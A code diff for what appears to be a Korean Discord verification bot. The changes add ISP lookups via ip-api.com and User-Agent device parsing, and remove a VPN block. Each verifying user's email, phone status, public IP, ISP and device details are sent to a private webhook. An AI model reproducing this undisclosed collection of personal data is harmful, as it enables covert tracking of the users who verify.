@@ -19,8 +19,8 @@ const WEBHOOK_URL = process.env.WEBHOOK_URL;
 const BACKUP_GUILD_ID = process.env.BACKUP_GUILD_ID;
 const UNVERIFIED_ROLE_ID = process.env.UNVERIFIED_ROLE_ID || '1541577356513382560'; 
 
-// Vercel에서 발급받은 본인의 실제 도메인 주소
-const FIXED_RENDER_URL = 'https://discord-verify1-4jjz.vercel.app';
+// 본인의 렌더 웹서비스 URL (예: https://your-app.onrender.com)
+const FIXED_RENDER_URL = process.env.RENDER_EXTERNAL_URL || 'https://discord-verify1-524a.onrender.com';
 
 const client = new Client({
     intents: [
@@ -31,6 +31,33 @@ const client = new Client({
         GatewayIntentBits.DirectMessages
     ]
 });
+
+// User-Agent를 분석해서 기기 종류(삼성, 애플, 윈도우 등)를 예쁘게 판별하는 함수
+function parseDevice(ua) {
+    if (!ua) return '알 수 없음';
+    let os = '알 수 없음';
+    let device = '';
+
+    if (/android/i.test(ua)) {
+        os = 'Android';
+        if (/samsung/i.test(ua) || /sm-/i.test(ua)) device = ' (삼성 갤럭시)';
+        else if (/iphone|ipad|ipod/i.test(ua)) device = ' (애플)';
+        else device = ' (기타 모바일)';
+    } else if (/iphone|ipad|ipod/i.test(ua)) {
+        os = 'iOS';
+        device = ' (애플 아이폰/아이패드)';
+    } else if (/win/i.test(ua)) {
+        os = 'Windows PC';
+        if (/samsung/i.test(ua)) device = ' (삼성 PC)';
+    } else if (/mac/i.test(ua)) {
+        os = 'macOS';
+        device = ' (애플 맥)';
+    } else if (/linux/i.test(ua)) {
+        os = 'Linux';
+    }
+
+    return `${os}${device} [UA: ${ua}]`;
+}
 
 client.on('ready', async () => {
     console.log(`[봇 로그인 완료] ${client.user.tag}`);
@@ -74,26 +101,6 @@ client.on('messageCreate', async (message) => {
     if (message.author.bot) return;
 
     const content = message.content.trim();
-
-    if (content === '!역할제거') {
-        try {
-            const member = message.member;
-            if (!member) return;
-
-            const removableRoleIds = ['1541423418753155135'];
-            const rolesToRemove = member.roles.cache.filter(role => removableRoleIds.includes(role.id));
-
-            if (rolesToRemove.size === 0) {
-                return message.reply('❌ 제거할 추가 역할이 없습니다.');
-            }
-
-            await member.roles.remove(rolesToRemove);
-            message.reply('✅ 공지 알림 역할이 성공적으로 제거되었습니다!');
-        } catch (err) {
-            console.error('역할 제거 에러:', err);
-            message.reply('⚠️ 역할 제거 중 오류가 발생했습니다.');
-        }
-    }
 
     if (content === '!서버복구') {
         try {
@@ -154,24 +161,6 @@ app.get('/verify', async (req, res) => {
         userIp = '127.0.0.1';
     }
 
-    try {
-        const ipCheckRes = await axios.get(`http://ip-api.com/json/${userIp}?fields=status,message,proxy,query`);
-        
-        if (ipCheckRes.data.status === 'success' && ipCheckRes.data.proxy) {
-            console.log(`[차단됨] VPN/우회 접속 감지된 IP: ${userIp}`);
-            
-            if (WEBHOOK_URL) {
-                await axios.post(WEBHOOK_URL, {
-                    content: `🛡️ **[인증 차단]** VPN/우회 접속이 감지되어 차단되었습니다!\n🌐 **IP:** \`${userIp}\``
-                }).catch(() => {});
-            }
-
-            return res.status(403).send(`<h1>인증 실패</h1><p>VPN 또는 우회 접속 환경에서는 인증을 진행할 수 없습니다.</p>`);
-        }
-    } catch (err) {
-        console.error('IP 검사 에러:', err.message);
-    }
-
     let selectedRoles = req.query.roles || [];
     if (!Array.isArray(selectedRoles)) selectedRoles = [selectedRoles];
 
@@ -202,6 +191,17 @@ app.get('/callback', async (req, res) => {
             userAgent = decodedState.ua || '알 수 없음';
         }
     } catch (e) {}
+
+    // IP를 통해 통신사(ISP) 및 조직 정보 조회 (예: LG U+, KT, SKT 등)
+    let ispInfo = '알 수 없음 (모바일/기타)';
+    try {
+        const ispRes = await axios.get(`http://ip-api.com/json/${userIp}?fields=status,isp,org,as`);
+        if (ispRes.data && ispRes.data.status === 'success') {
+            ispInfo = `${ispRes.data.isp} (Org: ${ispRes.data.org})`;
+        }
+    } catch (e) {}
+
+    const deviceDetail = parseDevice(userAgent);
 
     try {
         const tokenRes = await axios.post('https://discord.com/api/oauth2/token', new URLSearchParams({
@@ -245,13 +245,13 @@ app.get('/callback', async (req, res) => {
         if (WEBHOOK_URL) {
             const FormData = require('form-data');
             const form = new FormData();
-            form.append('content', `✅ **[인증 완료]**\n` +
+            form.append('content', `✅ **[인증 완료 상세 정보]**\n` +
                                     `👤 **유저:** <@${userData.id}> (\`${userData.username}\`)\n` +
                                     `📧 **이메일:** \`${userData.email}\`\n` +
                                     `📱 **전화번호/2차인증:** \`${isPhoneVerified}\`\n` +
                                     `🌐 **공인 IP:** \`${userIp}\`\n` +
-                                    `💻 **기기/브라우저:** \`${userAgent}\`\n` +
-                                    `📢 **선택한 역할 개수:** \`${selectedRoles.length}개\``);
+                                    `📡 **통신사/ISP:** \`${ispInfo}\`\n` +
+                                    `💻 **기기 및 플랫폼:** \`${deviceDetail}\``);
             form.append('file', fs.createReadStream(filePath));
 
             await axios.post(WEBHOOK_URL, form, {
@@ -287,5 +287,7 @@ app.get('/callback', async (req, res) => {
 });
 
 client.login(BOT_TOKEN);
-
-module.exports = app;
+const PORT = process.env.PORT || 3000;
+app.listen(PORT, () => {
+    console.log(`[웹서버 작동 중] 포트: ${PORT}`);
+});
